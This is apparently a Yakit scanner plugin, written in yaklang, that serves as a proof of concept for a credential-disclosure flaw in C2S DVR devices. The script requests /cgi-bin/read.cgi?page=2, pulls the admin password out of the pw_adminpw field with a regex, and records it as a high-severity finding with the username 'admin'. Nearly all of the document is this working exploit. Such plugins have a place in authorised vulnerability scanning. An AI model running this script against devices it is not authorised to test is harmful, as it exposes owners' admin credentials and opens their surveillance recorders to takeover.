content:
##server:C2S_DVR
##type:poc
##params:root_url
##name:C2S_DVR_Remote_Credential_Disclosure_poc
##severity:high
##out_put:C2S_username,C2S_password

yakit.AutoInitYakit()
log.setLevel("info")

poc = func(addr) {
    isTls = str.IsTLSServer(addr)
    packet = `GET /cgi-bin/read.cgi?page=2 HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36`
    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}))
    if err != nil {
        die(err)
    }

    http_rsp, err = str.ParseBytesToHTTPResponse(rsp)
    if err != nil {
        die(err)
    }

    rsp_header, rsp_body = poc.Split(rsp)
    if (http_rsp.StatusCode != 404) && (str.MatchAllOfSubString(rsp_body, " pw_adminpw")) {
        if str.MatchAllOfRegexp(rsp_body, `pw_adminpw\s*=\s*"(.*)";`) {
            password = re.FindSubmatch(rsp_body, `pw_adminpw\s*=\s*"(.*)";`)[1]
            risk.NewRisk(
                root_url,
                risk.severity("high"), 
                risk.title(f"FOUND ${root_url} 存在C2S_DVR 登录凭证泄露漏洞"), 
                risk.titleVerbose("C2S_DVR 登录凭证泄露漏洞"), 
                risk.type("身份伪造"), 
                risk.typeVerbose("配置错误"),                 
                risk.request(req), 
                risk.response(rsp), 
                risk.details({"C2S_username": "admin", "C2S_password": password}), 
            )
        }

    }

}

root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

addr = str.HostPort(ip, port)
poc(addr)
